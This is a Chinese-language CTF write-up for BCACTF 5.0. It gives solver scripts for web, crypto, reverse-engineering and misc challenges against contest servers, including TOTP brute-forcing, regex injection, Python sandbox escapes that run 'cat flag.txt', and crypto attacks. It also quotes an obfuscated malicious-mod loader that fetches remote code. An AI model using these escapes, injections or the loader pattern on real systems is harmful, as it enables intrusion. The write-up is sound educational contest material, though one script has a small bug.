# BCACTF 5.0

> 期末周复习累了来打会CTF提提神。队里就我和[学弟](https://blog.xciphand.icu/2024/06/10/BACTF/)然后还被学弟带飞了 Orz...

## Web

web 打不动一点，，，

### Sea Scavenger

捉迷藏就不写了，头疼（

### MOC, Inc.

server.py

```python
from flask import Flask, request, render_template

import datetime
import sqlite3
import random
import pyotp
import sys

random.seed(datetime.datetime.today().strftime('%Y-%m-%d'))

app = Flask(__name__)

@app.get('/')
def index():
    return render_template('index.html')

@app.post('/')
def log_in():
    with sqlite3.connect('moc-inc.db') as db:
        result = db.cursor().execute(
            'SELECT totp_secret FROM user WHERE username = ? AND password = ?',
            (request.form['username'], request.form['password'])
        ).fetchone()

    if result == None:
        return render_template('portal.html', message='Invalid username/password.')

    totp = pyotp.TOTP(result[0])

    if totp.verify(request.form['totp']):
        with open('../flag.txt') as file:
            return render_template('portal.html', message=file.read())

    return render_template('portal.html', message='2FA code is incorrect.')

with sqlite3.connect('moc-inc.db') as db:
    db.cursor().execute('''CREATE TABLE IF NOT EXISTS user (
        username TEXT UNIQUE NOT NULL,
        password TEXT NOT NULL,
        totp_secret TEXT NOT NULL
    )''')
    db.commit()

if __name__ == '__main__':
    if len(sys.argv) == 3:
        SECRET_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'

        totp_secret = ''.join([random.choice(SECRET_ALPHABET) for _ in range(20)])

        with sqlite3.connect('moc-inc.db') as db:
            db.cursor().execute('''INSERT INTO user (
                username,
                password,
                totp_secret
            ) VALUES (?, ?, ?)''', (sys.argv[1], sys.argv[2], totp_secret))
            db.commit()

        print('Created user:')
        print('  Username:\t' + sys.argv[1])
        print('  Password:\t' + sys.argv[2])
        print('  TOTP Secret:\t' + totp_secret)

        exit(0)

    app.run()
```

OTP Token 用当前日期作为种子生成。猜测题目应该挺新的就从最近一个月开始直接爆破（其实最近一年应该也可以爆出来）

```python
import datetime, random, requests, pyotp
from tqdm import *

start = datetime.datetime.strptime("2024-05-01", "%Y-%m-%d")
end = datetime.datetime.strptime("2024-06-09", "%Y-%m-%d")
SECRET_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'

url = 'http://challs.bcactf.com:31772/'
for i in tqdm(range(60)):
    random.seed(start.strftime("%Y-%m-%d"))
    data = {
        'username': 'admin',
        'password': 'admin',
        'totp': pyotp.TOTP(''.join([random.choice(SECRET_ALPHABET) for _ in range(20)])).now()
    }
    res = requests.post(url, data=data)
    if 'incorrect' not in res.text:
        print(res.text)
        break
    start += datetime.timedelta(days=1)
```

### jslearning

> Frank 一眼就看出来然后秒了（

用JSFuck编码一下丢上去就出来了。payload

```javascript
res.send(flag)
```

对应的 JSFuck

```javascript
(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+([][[]]+[])[!+[]+!+[]]+([][[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[!+[]+!+[]]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(![]+[+[]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+([+[]]+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]
```

### NoSQL

provided.js

```javascript
const express = require('express')

const app = express();
const port = 3000;
const fs = require('fs')
try {
    const inputD = fs.readFileSync('table.txt', 'utf-8');
    text = inputD.toString().split("\n").map(e => e.trim());
} catch (err) {
    console.error("Error reading file:", err);
    process.exit(1);
}

app.get('/', (req, res) => {
    if (!req.query.name) {
        res.send("Not a valid query :(")
        return;
    }
    let goodLines = []
    text.forEach( line => {
        if (line.match('^'+req.query.name+'$')) {
            goodLines.push(line)
        }
    });
    res.json({"rtnValues":goodLines})
})

app.get('/:id/:firstName/:lastName', (req, res) => {
    // Implementation not shown
    res.send("FLAG")
})

app.listen(port, () => {
    console.log(`App server listening on ${port}. (Go to http://localhost:${port})`);
});
```

把用户输入嵌入到正则里面匹配。。。直接注入通配 payload

```
http://challs.bcactf.com:30390/?name=.*
```

爆出来

```json
{"rtnValues":["Ricardo Olsen","April Park","Francis Jackson","Ana Barry","Clifford Craig","Andrew Wise","Ada Atkinson","Janis McIntosh","Rosie Parsons","Neal Weaver","Alyssa Robison","Michael Hurst","Roberto Thornton","Renee Schwartz","Darryl Wilson","Wayne Boyle","Loretta Camacho","Bert Morton","Suzanne Johnson","Carol Fowler","Rose Hansen","Aimee Norman","Bethany Foley","Benjamin Baily","David Hull","Sabrina Fish","Rick Kirby","Edgar Grimes","Blake McDermott","Alicia Crosby","Teresa Ortega","Carroll Darling","Louis Tate","Phillip Fuller","Clinton Kimball","Alma Matthews","Stacie Franklin","Lucinda Steward","Gina Andrews","Philip Hyde","Devin Riggs","Michelle Thornton","Rogelio Freeman","Arthur Stephens","Andy Leon","Megan Gould","Myrna Yates","Edwin Pearce","Shirley Cannon","Lowell Cochran","Flag Holder"]}
```

最后一个就是flag，然后题目提示第一个用户的id是1，那最后一个就是51。

### Tic-Tac-Toe

跟人工智能(zhang)玩井字棋，去年hackergame有[类似的题目](https://github.com/USTC-Hackergame/hackergame2023-writeups/blob/master/official/%E8%B5%9B%E5%8D%9A%E4%BA%95%E5%AD%97%E6%A3%8B/README.md)。思路几乎一样，F12抓包，修改伪造请求然后发送。

```javascript
const ws = new WebSocket((location.origin + '/ws').replace('http', 'ws'))
for(let i = 0; i < 3; i++) {
    ws.send(JSON.stringify({
        packetId: 'move',
        position: i
    }))
}
```

flag 在 ` F12 -> Network` 里的websokcet里面: 

````json
{"packetId":"gameOver","message":"You win! bcactf{7h3_m4st3r_0f_t1ct4ct0e_678d52c8}"}
````

### Phone Number

前端摇骰子输入号码。直接伪造即可（源代码被丑化过

```javascript
async function submit  ( ) {
 await fetch('/flag',	{
 method : "POST" ,
 body : 1234567890
 }).then ((res) => 
    res.text()).then((text)	=> text.length !== 0 ? document.body.innerHTML = text:alert("Sorry, incorrect."));
}
submit();
```

### Cookie Clicker

provided.js

```javascript

const port = 3000;

const socketIo = require('socket.io');
const io = socketIo(http);


let sessions = {}
let errors = {}

app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile("./index.html")
})

io.on('connection', (socket) => {
    sessions[socket.id] = 0
    errors[socket.id] = 0

    socket.on('disconnect', () => {
        console.log('user disconnected');
    });

    socket.on('chat message', (msg) => {
        socket.emit('chat message', msg);
    });

    socket.on('receivedError', (msg) => {
        sessions[socket.id] = errors[socket.id]
        socket.emit('recievedScore', JSON.stringify({"value":sessions[socket.id]}));
    });

    socket.on('click', (msg) => {
        let json = JSON.parse(msg)

        if (sessions[socket.id] > 1e20) {
            socket.emit('recievedScore', JSON.stringify({"value":"FLAG"}));
            return;
        }

        if (json.value != sessions[socket.id]) {
            socket.emit("error", "previous value does not match")
        }

        let oldValue = sessions[socket.id]
        let newValue = Math.floor(Math.random() * json.power) + 1 + oldValue

        sessions[socket.id] = newValue
        socket.emit('recievedScore', JSON.stringify({"value":newValue}));

        if (json.power > 10) {
            socket.emit('error', JSON.stringify({"value":oldValue}));
        }

        errors[socket.id] = oldValue;
    });
});

http.listen(port, () => {
    console.log(`App server listening on ${port}. (Go to http://localhost:${port})`);
});
```

发现只有`socket.on('receivedError', (msg) => {...})` 这个函数会在收到恶意value时还原上一个value，而这个请求是客户端发送的，所以拦截这个请求即可。（所以不要收到ack err再还原，检测到err立刻还原，ack不ack都无所谓（（（

直接Burpsuite抓包然后修改再发包，把报错请求drop掉即可。

## Crypto

### RSAEncrypter

chall.py

```python
from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes

message = open("./flag.txt").read().encode('utf-8')  
def encode():
    n = getPrime(512)*getPrime(512)
    ciphertext = pow(bytes_to_long(message), 3, n)
    return (ciphertext, n)

print("Return format: (ciphertext, modulus)")
print(encode())
sent = input("Did you recieve the message? (y/n) ")
while sent=='n':
    print(encode())
    sent = input("How about now? (y/n) ")
print("Message acknowledged.")
```

非常明显的低指数广播攻击。只需要3对明文密文即可

```python
from gmpy2 import *
from Crypto.Util.number import *

c1 = 47976262245834141794735399987049946625312941343836734612219555927957439281665090738675501689704402770298420185414641958072663869298888962263954961478201274830120436858871347820868739701138221708615019725305086980926068823438942069604963134641111939774986865841604922789380779463061633724147811180076205461806
n1 = 90237806659841434573157426261105410200804232991594143153581191469818602326395895554151947093736182423766379434131068779006377367277087328753973149242772192835424309505449947174106525455325911034079666618535257126535901287912866330853379489886621758189729274924167513628526137837034010246240161244101645053923

c2 = 7420300533351120969152119149836320509600143708954651679503267354613930621429399358716580942133672524281088443738295566947041338096244981166911025062492235496670315242054736643010113407782472300265358537968812567451482350110798931870889372169896856545867016847012078346126318122906220528051171822433806273350
n2 = 74640995032021728988348375336321163607166264395092254432700807155411381920349406432117642372633313219572448638032921135865714860256869903906501982374852618428404112631546880496474240565765114671220798970315319103625026968604830231202226320753233354930115202179801066108907859011047673170333705611642073287643

c3 = 12053097808594920164019372157990780442519439157573557460953175951799236741523923119915455929382209109617647288295556833563074958963582092354962131271824882838368686402869866522863838207967304615404364954904634533678974301126551496238149751867749707403771217947528847716644036878103378708613115523322319256311
n3 = 73107071844000241093262039344512624053836869485894299811440103113400669046708552887013641871617498420675725363205463364297508200094532077114230015977790356082772751137709997325880062029122621482975488325682759488800857589553312067861424158132894506055249892243317086812326550837092374911253697981813189842327

def decrypt(n1, c1, n2, c2, n3, c3):
    M1 = n2 * n3
    M2 = n1 * n3
    M3 = n1 * n2
    m_e = (c1 * M1 * invert(M1, n1) + c2 * M2 * invert(M2, n2) + c3 * M3 * invert(M3, n3)) % (n1 * n2 * n3)
    e = 3
    m = iroot(m_e, e)
    if m[1]:
        print(long_to_bytes(m[0]))

if __name__ == '__main__':
    decrypt(n1, c1, n2, c2, n3, c3)
```

### Cha-Cha Slide

server.py

```python
from Crypto.Cipher import ChaCha20

from os import urandom

key = urandom(32)
nonce = urandom(12)

secret_msg = urandom(16).hex()

def encrypt_msg(plaintext):
    cipher = ChaCha20.new(key=key, nonce=nonce)
    return cipher.encrypt(plaintext.encode()).hex()

print('Secret message:')
print(encrypt_msg(secret_msg))

print('\nEnter your message:')
user_msg = input()

if len(user_msg) > 256:
    print('\nToo long!')
    exit()

print('\nEncrypted:')
print(encrypt_msg(user_msg))

print('\nEnter decrypted secret message:')
decrypted_secret_msg = input()

if len(decrypted_secret_msg) == len(secret_msg):
    if decrypted_secret_msg == secret_msg:
        with open('../flag.txt') as file:
            print('\n' + file.read())
        exit()

print('\nIncorrect!')
```

流密码 chacha20 的已知明文攻击，非常trival

假设明文为$m_1, m_2$ 对应的密文为$c_1, c_2$，流密码算法的stream为$s$，那么

$$ \begin{align*} c_1 &= m_1 \oplus s \\ c_2 &= m_2 \oplus s \end{align*} $$

所以有 

$$ c_1 \oplus c_2 = m_1 \oplus s \oplus m_2 \oplus s = m_1 \oplus m_2$$

然后如果$m_1$是secret，那么我们知道$m_2$就可还原出$m_1$。payload 如下

```python
from pwn import *

p = remote('challs.bcactf.com', 31594)
p.recvline()
secret_msg = bytes.fromhex(p.recvline().decode())
message = b'a' * len(secret_msg)
p.recvline()
p.recvline()
p.sendline(message)
p.recvline()
p.recvline()
enc_message = bytes.fromhex(p.recvline().decode())

# decrypt the message
xored = b""
for i in range(len(secret_msg)):
    xored += bytes([secret_msg[i] ^ enc_message[i]])

pt = b""
for i in range(len(xored)):
    pt += bytes([xored[i] ^ message[i]])

p.sendline(pt)
p.recvline()
p.recvline()
p.recvline()
print(p.recvline().decode())

```

### Time Skip

> One of our problem writers got sent back in time! We found a piece a very very old piece of parchment where he disappeared, alongside a long cylinder. See if you can uncover his flag!

parchment.txt

```plain
hsggna0stiaeaetteyc4ehvdatyporwtyseefregrstaf_etposruouoy{qnirroiybrbs5edmothssavetc8hebhwuibihh72eyaoepmlvoet9lobulpkyenf4xpulsloinmelllisyassnousa31mebneedtctg_}eeedeboghbihpatesyyfolus1lnhnooeliotb5ebidfueonnactayseyl
```

搜索题目描述关键字，cylinder和parchment得知是`scytale`加密。[解密工具](https://www.dcode.fr/scytale-cipher)得到明文

```
heyguysimkindoflostprobablynotgoingtosurvivemuchlongertobehonestbutanywaystheflagisbcactf{5c7t4l3_h15t04y_qe829xl1}pleasesendhelpimeanbythetimeyouseethisiveprobablybeendeadforthousandsofyearsohwellseeyoulaterisupposebyee_
```

### Vinegar Times 3

> #### Description:
>
> We can't speak French and just say what we see.
>
> We also don't know what underscores are add them yourself.
>
> put **ONLY** the final decrypted cipher in bcactf{}, no intermediate steps
>
> key - vinegar
>
> cipher 0 - mmqaonv
>
> cipher 1 - seooizmt
>
> cipher 2 - bdoloeinbdjmmyg <- THIS ONE

将cipher 0 用 key 解密，结果再作为cipher 1的key解密，再作为cipher 2的key解密即可。

### Encryptor Shop

> 这道密码有点搞笑。。。

server.py

```python
from Crypto.Util.number import *

p = getPrime(1024)
q = getPrime(1024)
r = getPrime(1024)
n = p * q
phi = (p - 1) * (q - 1)
e = 65537
d = pow(e, -1, phi)

print("Welcome to the enc-shop!")
print("What can I encrypt for you today?")


for _ in range(3):
    message = input("Enter text to encrypt: ")
    m = bytes_to_long(message.encode())
    c = pow(m, e, n)
    print(f"Here is your encrypted message: {c}")
    print(f"c = {c}")
    print("Here is the public key for your reference:")
    print(f"n = {n}")
    print(f"e = {e}")
    
print("Thank you for encrypting with us!")
print("In order to guarantee the security of your data, we will now let you view the encrypted flag.")
x=input("Would you like to view it? (yes or no) ")

if x.lower() == "yes":
    with open("flag.txt", "r") as f:
        flag = f.read().strip()
    m = bytes_to_long(flag.encode())
    n = p*r
    c = pow(m, e, n)
    print(f"Here is the encrypted flag: {c}")
    print("Here is the public key for your reference:")
    print(f"n = {n}")
```

前面的已知明文攻击都可以免了。第一次用的模数是 $n_1 = p * q$，flag加密用的是$n_2 = p * r$。这不，就差直接给$p$了

$$ p = gcd(n_1, n_2)$$

然后剩下的就很简单了，直接手动解密。

## Rev

队里没人打rev，我随便玩玩（爬了

### Broken C Code

随机加了点数混淆，可以patch也可以静态。静态简单就静态了

```python
from math import *
a = [9607, 9804, 9412, 9804, 13459, 10407, 15132, 9804, 9028, 9804, 2307, 10003, 4764, 9028, 10407, 5332, 7747, 10204, 4627, 9028, 3028, 5187, 2707, 6087, 5628, 2812, 9028, 3028, 2919, 2503, 2707, 3028, 3139, 2503, 3028, 2919, 15628, 103]
b = ''
for i in range(38):
    b += chr(int(sqrt(a[i] + 3)))
print(b)
```

### My Brain Hurts

script.txt

```brainfuck
,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,<----<++++++<---------<++<-<+++++<-------<+++++++++<-------<----<---<++++<--<+++<+++++++<+++<+<++<---------------<+++++<-------<---<----.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.
```

string.txt

```plain
^`Zheh|Ey7/r\b\T&6r/][j}
```

brainfuck，直接跑程序崩了。猜测应该需要反着做还原string.txt。brainfuck 的模拟图灵机挺简单的，`-` 和 `=` 换一下就可以了。

还原的 script_rev.txt，然后string.txt 输入进去

```
,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,<++++<------<+++++++++<--<+<-----<+++++++<---------<+++++++<++++<+++<----<++<---<-------<---<-<--<+++++++++++++++<-----<+++++++<+++<++++.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.
```

### Flagtureiser

背景应该是一个 Minecraft 恶意Mod。反编译一下然后这串代码非常可疑，应该是为了免杀。

```java
Class.forName(new String(new byte[] { 
              106, 97, 118, 97, 46, 110, 101, 116, 46, 85, 
              82, 76, 67, 108, 97, 115, 115, 76, 111, 97, 
              100, 101, 114 })).getConstructor(new Class[] { URL[].class }).newInstance((Object[])new URL[] { new URL(new String(new byte[] { 104, 116, 116, 112 }, ), new String(new byte[] { 
                  98, 99, 97, 99, 116, 102, 123, 102, 82, 97, 
                  67, 116, 117, 114, 51, 49, 115, 51, 82, 95, 
                  115, 84, 56, 103, 69, 95, 122, 51, 82, 48, 
                  125 }, ), 8080, new String(new byte[] { 47, 100, 108 })) })).getMethod(new String(new byte[] { 114, 117, 110 }, ), new Class[] { String.class }).invoke(null, new Object[] { "-114.-18.38.108.-100" });
  }
```

然后这串数组喂给cyberchef就直接出来flag了。

## Misc

外国人的misc都有点脑洞...... 以及他们貌似喜欢单独开一个forensic，这里就合并在misc了。

### JailBreak 1

deploy.py

```python
def sanitize(letter):
    print("Checking for contraband...")
    return any([i in letter.lower() for i in BANNED_CHARS])

BANNED_CHARS = "gdvxftundmnt'~`@#$%^&*-/.{}"
flag = open('flag.txt').read().strip()

print("Welcome to the prison's mail center")
msg = input("Please enter your message: ")

if sanitize(msg): 
    print("Contraband letters found!\nMessage Deleted!")
    exit()

exec(msg)
```

绕过一些字符限制读flag变量即可，最后用help打成功了。payload

```python
help(locals()[(chr(102)+chr(108)+chr(97)+chr(103))])
```

### Mathjail

No builtins, 啥都没过滤直接继承链

```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("cat flag.txt")
```

### This is NOT the flag

> 肯定不是密码题

NOTflag.txt

```plain
nZyenIuZhMiXtoygzoygyJfMoJmTnsaC
```

长得很像base64，但是cyberchef解不出来，尝试[dcode.fr](https://www.dcode.fr/code-base-64)爆破所有表，试出来是`46esab`表。

### 23-719

PDF隐藏文字内容，表面看不出来，直接选中复制就出来了。

### Chalkboard Gag

> #### Hints:
>
> There are some unique differences in some of the lines...

找出现最多的一行作为基准，然后稳定去重(相对顺序不变)，找相同位置的不同字符挑出来，最后拼接起来就是flag。

```python
lines = []
file = open('chalkboardgag.txt', 'r')
base = file[0]
for line in file:
    if line != base:
        lines.append(line)

def get_char(line):
    assert len(line) == len(base)
    for i in range(len(line)):
        if base[i] != line[i]:
            return line[i]

flag = ''
for line in lines:
    flag += get_char(line)
print(flag)
```
